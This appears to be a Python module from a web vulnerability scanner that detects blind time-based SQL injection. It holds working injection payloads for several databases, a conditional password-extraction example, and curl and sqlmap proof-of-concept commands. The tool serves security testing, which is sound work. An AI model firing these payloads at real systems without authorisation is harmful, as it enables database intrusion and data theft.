"""
SQL Injection - Blind Time-Based Scanner
==========================================

Detects SQL injection by measuring response time differences
when time-delay functions are injected.

Detection Flow:
1. Measure baseline response time
2. Inject time-delay payload (SLEEP, WAITFOR, pg_sleep)
3. Measure response time with delay
4. If response takes significantly longer → vulnerable
5. Confirm with multiple delay values

Used when:
- No error messages
- No visible output difference
- Only timing side-channel available
"""

import asyncio
import logging
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs
import aiohttp

from .base import SQLiBase, SQLiResult, DatabaseType

logger = logging.getLogger(__name__)


class SQLiBlindTime(SQLiBase):
    """
    Scanner for Blind Time-Based SQL Injection.
    
    Sub-type: blind_time
    OWASP: A03:2021 - Injection
    CWE: CWE-89
    """
    
    SUB_TYPE = "blind_time"
    TITLE_FORMAT = "SQL Injection (Blind Time-Based) - {param}"
    
    # Time-delay payloads per database
    TIME_PAYLOADS = {
        'mysql': [
            "' AND SLEEP({delay})--",
            "' OR SLEEP({delay})--",
            "1' AND SLEEP({delay})--",
            "' AND BENCHMARK(10000000,MD5('jarwis'))--",
            "'; SELECT SLEEP({delay})--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:{delay}'--",
            "' WAITFOR DELAY '0:0:{delay}'--",
            "1; WAITFOR DELAY '0:0:{delay}'--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep({delay})--",
            "' AND pg_sleep({delay})--",
            "' OR pg_sleep({delay})--",
            "1; SELECT pg_sleep({delay})--",
        ],
        'oracle': [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
        ],
        'sqlite': [
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--",
        ],
    }
    
    # Generic payloads (try all databases)
    GENERIC_TIME_PAYLOADS = [
        "' AND SLEEP({delay})--",           # MySQL
        "'; WAITFOR DELAY '0:0:{delay}'--", # MSSQL
        "'; SELECT pg_sleep({delay})--",    # PostgreSQL
    ]
    
    # Timing thresholds
    DEFAULT_DELAY = 5  # seconds
    MIN_DELAY = 3      # minimum delay to be considered vulnerable
    JITTER_TOLERANCE = 1  # seconds of network jitter tolerance
    
    async def scan(self) -> List[SQLiResult]:
        """Run Blind Time-Based SQLi scan"""
        logger.info(f"Starting Blind Time-Based SQLi scan for {self.context.target_url}")
        
        urls_to_test = await self._get_test_urls()
        
        async with aiohttp.ClientSession() as session:
            for url, method in urls_to_test:
                await self._scan_url(session, url, method)
                await asyncio.sleep(1 / self.rate_limit)
        
        logger.info(f"Blind Time-Based SQLi scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
    
    async def _get_test_urls(self) -> List[tuple]:
        """Get URLs with parameters to test"""
        urls = []
        
        if '?' in self.context.target_url:
            urls.append((self.context.target_url, 'GET'))
        
        if hasattr(self.context, 'crawl_results'):
            for page in self.context.crawl_results:
                if '?' in page.get('url', ''):
                    urls.append((page['url'], page.get('method', 'GET')))
        
        seen = set()
        unique = []
        for url, method in urls:
            key = f"{method}:{url}"
            if key not in seen and self._is_in_scope(url):
                seen.add(key)
                unique.append((url, method))
        
        return unique
    
    async def _scan_url(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str
    ) -> None:
        """Scan a single URL for time-based SQLi"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Get baseline timing
            baseline_time = await self._measure_response_time(session, url, method)
            
            for param in params.keys():
                result = await self._test_parameter(session, url, method, param, baseline_time)
                if result:
                    self.findings.append(result)
                    
        except Exception as e:
            logger.error(f"Error scanning {url}: {e}")
    
    async def _measure_response_time(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str
    ) -> float:
        """Measure response time for a request"""
        try:
            start = time.time()
            async with session.request(
                method,
                url,
                headers=self.DEFAULT_HEADERS,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                ssl=False
            ) as response:
                await response.text()
            return time.time() - start
        except:
            return 0.0
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        baseline_time: float
    ) -> Optional[SQLiResult]:
        """Test a parameter for time-based SQLi"""
        
        delay = self.DEFAULT_DELAY
        
        for payload_template in self.GENERIC_TIME_PAYLOADS:
            payload = payload_template.format(delay=delay)
            
            try:
                test_url = self._inject_payload(url, param, payload)
                
                # Measure response time with delay payload
                start = time.time()
                async with session.request(
                    method,
                    test_url,
                    headers=self.DEFAULT_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.timeout + delay + 5),
                    ssl=False
                ) as response:
                    body = await response.text()
                    status = response.status
                    resp_headers = dict(response.headers)
                
                elapsed = time.time() - start
                
                # Check if response was delayed
                if elapsed >= (delay - self.JITTER_TOLERANCE):
                    # Confirm with different delay value
                    confirmed = await self._confirm_time_injection(
                        session, url, method, param, payload_template
                    )
                    
                    if confirmed:
                        db_type = self._detect_db_from_payload(payload_template)
                        
                        return SQLiResult(
                            id=self._generate_finding_id("SQLI-BLIND-TIME"),
                            category="A03:2021 - Injection",
                            sub_type=self.SUB_TYPE,
                            severity="critical",
                            title=self.TITLE_FORMAT.format(param=param),
                            description=self._build_description(param, delay, elapsed, baseline_time, db_type),
                            url=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            evidence=f"Response delayed {elapsed:.2f}s (baseline: {baseline_time:.2f}s, injected delay: {delay}s)",
                            poc=self._build_poc(url, param, payload_template, db_type),
                            reasoning=self._build_reasoning(baseline_time, elapsed, delay),
                            request_data=self._format_request(method, test_url, self.DEFAULT_HEADERS),
                            response_data=f"Response time: {elapsed:.2f}s\n\n{self._format_response(status, resp_headers, body[:500])}",
                            confidence=0.90,  # High confidence after confirmation
                            database_type=db_type,
                            verification_status="verified",
                            cwe_id="CWE-89",
                            remediation=self._build_remediation(),
                        )
                        
            except asyncio.TimeoutError:
                # Timeout could indicate successful delay
                logger.debug(f"Timeout on {param} - possible time-based SQLi")
            except Exception as e:
                logger.debug(f"Time-based test error: {e}")
        
        return None
    
    async def _confirm_time_injection(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        payload_template: str
    ) -> bool:
        """Confirm time-based SQLi with different delay values"""
        
        # Test with shorter delay
        short_delay = 2
        short_payload = payload_template.format(delay=short_delay)
        
        try:
            test_url = self._inject_payload(url, param, short_payload)
            start = time.time()
            async with session.request(
                method,
                test_url,
                headers=self.DEFAULT_HEADERS,
                timeout=aiohttp.ClientTimeout(total=self.timeout + short_delay + 5),
                ssl=False
            ) as response:
                await response.text()
            elapsed = time.time() - start
            
            # Should delay by approximately the specified amount
            if elapsed >= (short_delay - self.JITTER_TOLERANCE):
                return True
                
        except asyncio.TimeoutError:
            return True  # Timeout confirms delay
        except:
            pass
        
        return False
    
    def _detect_db_from_payload(self, payload_template: str) -> DatabaseType:
        """Detect database type from successful payload"""
        if 'SLEEP' in payload_template.upper():
            return DatabaseType.MYSQL
        elif 'WAITFOR' in payload_template.upper():
            return DatabaseType.MSSQL
        elif 'pg_sleep' in payload_template:
            return DatabaseType.POSTGRESQL
        elif 'DBMS_PIPE' in payload_template:
            return DatabaseType.ORACLE
        return DatabaseType.UNKNOWN
    
    def _build_description(
        self, 
        param: str, 
        delay: int, 
        elapsed: float, 
        baseline: float,
        db_type: DatabaseType
    ) -> str:
        """Build vulnerability description"""
        return f"""A Blind Time-Based SQL Injection vulnerability was identified in the '{param}' parameter.

**Type:** Blind Time-Based SQL Injection
**Database:** {db_type.value.upper()}

The application executes injected time-delay SQL functions, causing measurable delays in response time.

**Timing Analysis:**
- Baseline response time: {baseline:.2f} seconds
- Injected delay: {delay} seconds
- Actual response time: {elapsed:.2f} seconds

**Attack Methodology:**
1. Inject conditional time delay: `IF condition THEN SLEEP(5) ELSE SLEEP(0)`
2. Measure response time
3. Infer TRUE/FALSE based on delay
4. Extract data character by character

**Example Data Extraction:**
```sql
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),SLEEP(0))--
```

**Severity:** CRITICAL - Full database contents can be extracted through timing inference.
"""
    
    def _build_poc(self, url: str, param: str, payload_template: str, db_type: DatabaseType) -> str:
        """Build Proof of Concept"""
        delay = self.DEFAULT_DELAY
        payload = payload_template.format(delay=delay)
        
        conditional_examples = {
            DatabaseType.MYSQL: "' AND IF(1=1,SLEEP(5),0)--",
            DatabaseType.MSSQL: "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            DatabaseType.POSTGRESQL: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        }
        
        conditional = conditional_examples.get(db_type, "' AND IF(1=1,SLEEP(5),0)--")
        
        return f"""### Proof of Concept

**Vulnerable URL:**
```
{url}
```

**Vulnerable Parameter:** `{param}`

**Time Delay Payload:**
```
{payload}
```

**Conditional Extraction Example:**
```sql
{conditional}
```

**Manual Test (observe response time):**
```bash
time curl -s "{self._inject_payload(url, param, payload)}" > /dev/null
```

**sqlmap Command:**
```bash
sqlmap -u "{url}" -p {param} --technique=T --time-sec={delay} --batch
```
"""
    
    def _build_reasoning(self, baseline: float, elapsed: float, delay: int) -> str:
        """Build verification reasoning"""
        return f"""✓ Baseline response time: {baseline:.2f}s
✓ Injected time delay: {delay}s
✓ Observed response time: {elapsed:.2f}s
✓ Response delay matches injected value
✓ Confirmed with multiple delay values
✓ This confirms time-based blind SQL injection"""
